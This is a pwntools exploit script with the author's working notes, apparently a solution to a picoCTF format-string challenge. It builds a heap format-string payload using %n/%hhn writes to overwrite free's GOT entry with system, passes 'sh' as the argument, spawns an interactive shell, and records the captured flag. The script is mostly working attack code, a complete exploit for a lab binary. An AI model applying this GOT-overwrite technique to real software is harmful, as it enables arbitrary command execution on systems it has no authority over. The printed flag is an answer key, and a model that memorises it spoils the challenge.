from pwn import *

def main():
    p = process('./vuln')

    # got value for free@plt 0x4006c6
    # got value for system@plt 0x4006f6

    # Pointer to free@plt 0000000000602018
    # Pointer to system@plt 0000000000602030

    p.recvuntil('View my portfolio\n')
    p.sendline('1')

    p.recvuntil('token?\n')

    # The format should be <number of bytes which represents the memory location of the value I need to change> <value i want at that address>
    # It is also important to note that the printf vulnerability is applying to the heap, not the stack
    # Format string vuln: <value to write at a given memory location which is represented in the number of bytes here>%p
    # If the memory is being allocated on the heap instead of the stack, what will the format string attack be printing?

    # Important Note:
    # Using something like this: %x.%x.%x... can help me find the arrangement / offsets in the stack
    # Additionally, the format is as follows: <address to write to>%<number $>n
    # <number $> can be considered as one "piece" of the expression; this specifies the position
    # %<number $>n can be considered as another piece; %n in and of itself is used to specify a pointer at some location on the stack
    # %hn can be used to write 2 bytes, while %hhn can be used to write 1 byte

    # Another useful command to find the pointer to the address for free@plt and system@plt is objdump -R vuln
    
    # For this exploit in particular, we need to overwrite the free@plt value with the system@plt value
    # Overwrite the value at pointer_to_freeplt with the got_value_systemplt
    # I think I only need to modify one byte, i.e. change 0xc0 -> 0xf0
    # Stack looks as follows:
    # 91ca5723.0.91bc6077.1a.7fffffff.400e41.129f2a0.400ca0.0.129f790.129f7b0.2633e0.400c66.2634d8.400ca0.0.400780.129f2a0.e7b40900.0.91adc083.91cec620.2634d8.0.
    # Return address is 0x400c66, which means it is the 13th value in the stack
    # This means that the argument that we pass in is the 11th value in the stack
    # Format will be as follows:  
    # <Location to write to> = p32(0x602018) = \x18\x20\x60\x00
    # Need to write the value 0xf6 -> 0xf6 - 0x4 = 0xf2 (0x4 for the 4 byte offset)
    # %11$hhn <-- to write at the first byte of the 11th value on the stack
    # payload = b'\x18\x20\x60\x00%242x%11$hhn'

    # Okay so it turns out I can't really use this method because we are working with the heap and not the stack in the allocation process
    # The string is stored on the heap, so trying to use it as a pointer is not possible. 
    # Instead, the rbp points to a memory address on the stack. It stores the value of the previous base pointer
    # We modify the value of the prev base pointer so that it is now the address of freegot
    # At that point, we can modify that memory address so that it points to system
    # Additionally, using the first base pointer, we can calculate the location of the value for the argument p
    # We modify p so that it is the string for /bin/sh 
    # Payload should look like this:
    # got value for free@plt 0x4006c6
    # got value for system@plt 0x4006f6

    # Pointer to free@plt 0000000000602018
    # Pointer to system@plt 0000000000602030
    # <Number of bytes equal to 0x602018> = 6299672 <-- is this number too big??
    # %<offset>$n = %12$n
    # At this point, the next rbp will be equal to 0x602018
    # <Number of bytes equal to 0xf6 = 246 bytes
    # Finally, we modify the argument at ebp again
    # Observation: %12$x%12$x produce the same value

    # We cannot use $ in the first sequence of strings for some reason; still don't really understand the logic of this but the rbp is restored?
    #payload = '%6299672x%12$n' + '%246x%20$hhn'
    #payload = '%6299672x%12$n%246x%20$hhn'
    # Instead, the payload must be constructed from three parts
    # Part 1: Writing into main rbp via second rbp with the value of freeplt
    # Part 2: Writing into freeplt via main rbp with the system call 
    # Part 3: Writing into the current pointer with sh string which is in little endian so 0x01006873
    payload = '%c%c%c%c%c%c%c%c%c%c%6299662x%n' + '%216x%20$hhn' + '%10504067c%18$n'
    print(payload)
    p.sendline(payload)
    p.interactive()

    # Flag: picoCTF{explo1t_m1t1gashuns_d67d2898}


if __name__ == '__main__':
    main()
